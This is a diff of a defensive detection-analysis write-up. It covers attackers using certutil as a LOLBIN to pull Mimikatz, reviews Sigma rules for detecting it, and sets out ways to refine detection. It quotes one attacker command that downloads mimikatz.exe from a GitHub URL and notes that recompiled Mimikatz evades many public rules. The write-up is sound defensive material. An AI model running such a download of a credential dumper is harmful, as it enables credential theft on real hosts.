@@ -1,14 +1,14 @@
 # Detection analysis
 
 ## What is under attacker control
-The threat actor chose to use LOLBIN and LOLBAS as part of their tooling. The TTPs vary in terms of complexity (additional stealth) and associated detection opportunities (behavior vs signature) 
+The threat actor chose to use LOLBIN as part of their tooling. The TTPs vary in terms of complexity (additional stealth) and associated detection opportunities (behavior vs signature).
 ```
 [ITSERVER:PowerShell] certutil -urlcache -f https://github.com/MihhailSokolov/SecTools/raw/main/mimikatz.exe C:\Temp\m.exe
 ```
 ## What did we actually look for
 Rules triggered by elements under attacker control are likely to have a shorter lifetime than those based on behaviors, we need to know where we are on the Pyramid of Pain. 
 
-### Mimikatz (skip)
+### Mimikatz 
 | # | Search | ATT&CK Techniques | Notes | Dependencies |
 | 3 | [file_event_win_hktl_mimikatz_files.yml](https://github.com/SigmaHQ/sigma/blob/4f4ef7a8cc077b2b54c71c598db50fe8b1f14d55/rules/windows/file/file_event/file_event_win_hktl_mimikatz_files.yml#L4) | [T1558](https://attack.mitre.org/techniques/T1558) | File extensions, operator decisions, hardcoded behavior of an open source tool | File writes being logged (Security 4663 OR EDR hooks)|
 | 21 | [sysmon_mimikatz_detection_lsass.yml](https://github.com/SigmaHQ/sigma/blob/4f4ef7a8cc077b2b54c71c598db50fe8b1f14d55/deprecated/windows/sysmon_mimikatz_detection_lsass.yml#L4) | [T1003](https://attack.mitre.org/techniques/T1003) | Already has silenced normal behavior allowing services and apps, which can be tampered with| Legacy environment, Non default noisy auditing of access |
@@ -29,15 +29,17 @@ Rules triggered by elements under attacker control are likely to have a shorter 
 ### Why LOLBAS are so challenging
 Exploit developers think in terms of "primitives" e.g. write what where<REF https://cwe.mitre.org/data/definitions/123.html>. In many environments, the use of certutil.exe is supposed to be rare. It is a so-called LOLBIN - Living Off the Land Binary, part of the bigger LOLBAS (Applications and Scripts) family <REF https://lolbas-project.github.io/>. Certutil's value its features and the fact that is signed by Microsoft and already installed. This offers one less "feature" or "capability" that the authors need to develop and embed in their toolkit to achieve their objectives. Detection opportunities for LOLBAS are multiple, and can yield some false positives as well as strong signals. 
 
-## Now what
-Consider many broader potentially overlapping detections, acting as failover for rules which may be too specific. A simple example approach would be to looking for hacking tool strings and names without specifying a field or index, and expecting false positives and effectively treating them as triggers for enrichments, rather than a final product. 
-Recompiling or reproducing a subset of features of Mimikatz is notoriously sufficient to bypass many public detection rules around the tool, but not its behavior. Any credential dumper needs to interact with credential stores to be useful, be they in the Windows registry, in memory or in the Windows registry in memory. Detections of behavior are unfortunately less often found in native logs, but EDRs performing hooking of select system APIs. 
+# What can we do about it?
+Many approaches can help to refine the detection, but boil down to three angles:
+- improve the detection logic
+- allowlist known-good events (baseline - True Positive Benign)
+- correlate events (eliminate false positives)
 
-Caveat and steps
-- Only apply this approach to high value detection use cases due to the additional effort
-- 3 approaches:
-  > improve detection logic (better datasource?), whitelist, or correlate
-Articulate a complementary deception strategy focused around relevant TTPs
+However, just because you could doesn't mean you should. This incurrs additional effort and you should apply this approach strategically for high value detection use cases. In some cases, a complementary deception strategy focused around relevant TTPs will be the cheapest way forward.
+
+In our case, we will consider many broader potentially overlapping detections, acting as failover for rules which may be too specific. A simple example approach would be to looking for hacking tool strings and names without specifying a field or index, and expecting false positives and effectively treating them as triggers for enrichments, rather than a final product. Recompiling or reproducing a subset of features of Mimikatz is notoriously sufficient to bypass many public detection rules around the tool, but not its behavior. Any credential dumper needs to interact with credential stores to be useful, be they in the Windows registry, in memory or in the Windows registry in memory. Detections of behavior are unfortunately less often found in native logs, but EDRs performing hooking of select system APIs. 
+
+## How do we get started
 
 ### Modernize (if needed) the way you search your data
 - Get used to leverage APIs and macros for your queries 
